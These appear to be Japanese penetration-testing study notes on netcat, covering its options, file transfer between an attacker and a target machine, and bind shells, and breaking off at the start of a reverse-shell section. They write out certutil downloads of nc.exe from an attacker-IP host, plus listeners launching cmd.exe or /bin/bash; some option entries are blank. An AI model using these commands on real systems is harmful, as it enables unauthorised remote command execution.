Netcatの基礎
・netcatはネットワーク接続上でデータを読み書きするためのネットワークユーティリティで、TCPまたはUDPを使用して動作する。
→ユーザがネットワーク接続を操作できるようにする多機能ツール
・netcatは、unix系およびwindowsの両方のOSで利用可能であり、クロスプラットフォームでの操作に非常に便利
→kalilinuxはプリパッケージされているが、windowsにはインストールされていない。
・netcatは、クライアント-サーバー型通信アーキテクチャを採用しており、次の2つのモードがある
1) クライアントモード：netcatをクライアントモードで使用して、任意のTCP/UDPポートまたはnetcatリスナーに接続できる
2) サーバーモード：netcatをサーバーモードで使用して、特定のポートでクライアントからの接続を待ち受けることができる
・netcatは、ペンテスターによって以下の機能を実行するために使える
1) バナーグラビング
2) ポートスキャン
3) ファイル転送
4) バインド/リバースシェル
・オプション
1) -n：DNS解決を無効にする。
2) -v：詳細表示を行う
3) -l：
4) -p：
5) nc -help：netcatヘルプメニューを表示する
6) -u：UDPポートへの接続を試みるときに使う

demo 2つのシステム間でファイル転送を行う
1) 攻撃者マシンとターゲットマシンにアクセスできるようにする。
2) pingでターゲットと通信可能かを確認する
3) nc targetIP port_numを使って開いているポートに接続する
4) 実行ファイルをホストできるようにするためにpythonを使用してHTTPサーバーをセットアップする
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80（python3 -m http.server 80)
5) ifconfigを使用して攻撃者のIPアドレスを確認する
6) ターゲットマシンに移動して、以下のコマンドを使用して攻撃者マシンでホストされているwebサーバーからnc.exe実行可能ファイルをダウンロードする
certutil -urlcache -f http://攻撃者マシンIP/nc.exe nc.exe
7) 攻撃者マシンでnetcatリスナーをセットする
nc -nvlp 1234
8) 以下のコマンドをターゲットマシンで実行して接続できるようにする
nc -nv 攻撃者IP 1234
9) ターゲットのnetcatリスナーを設定する
nc.exe -nvlp 1234 > ファイル名
10) kalilinuxシステムでもリスナーに接続し、ファイルの内容をnetcatにリダイレクトする
nc -v ターゲットIP 1234 < ファイル名


バインドシェル
・バインドシェルとは、リモートシェルの1種であり、攻撃者がターゲットシステム上のリスナーに直接接続することで、ターゲット上でコマンドを実行できるように
する仕組み
・netcatのリスナー（待ち受け側）は、特定の実行ファイル(cmd.exeや/bin/bash)を起動するように設定することができる
・クライアントがリスナーに接続すると、そのシェルが実行される

demo
1) 攻撃者マシンとターゲットマシンにアクセスできるようにする。
2) netcat実行可能ファイルをWindowsシステムに転送する
cd /usr/share/windows-binaries
python3 -m http.server 80
ifconfig
certutil -urlcache -f http://攻撃者IP/nc.exe nc.exe
3) 以下のコマンドでWindowsシステム上でnetcqatリスナーを設定し、クライアント接続時にcmd.exeを実行する
nc.exe -nvlp 1234 -e cmd.exe
4) 以下のコマンドでkalilinuxからWindowsシステムで実行されているバインドシェルリスナーに接続する
nc -v targetIP 1234
以下のコマンドを使用すると、接続すると、/bin/bashをWindowsシステムで実行する
nc -nvlp 1234 -e /bin/bash
5) 以下のコマンドを使用するとWindowsシステムからkalilinuxシステム上のバインドシェルリスナーに接続できるようになる
nc.exe -nv 攻撃者IP 1234

リバースシェル
・リバースシェルは、リモートシェルの1種で、ターゲットが攻撃者のシステム上のリスナーに直接接続する仕組み
・ターゲットシステム上でコマンドを実行できるようにする。
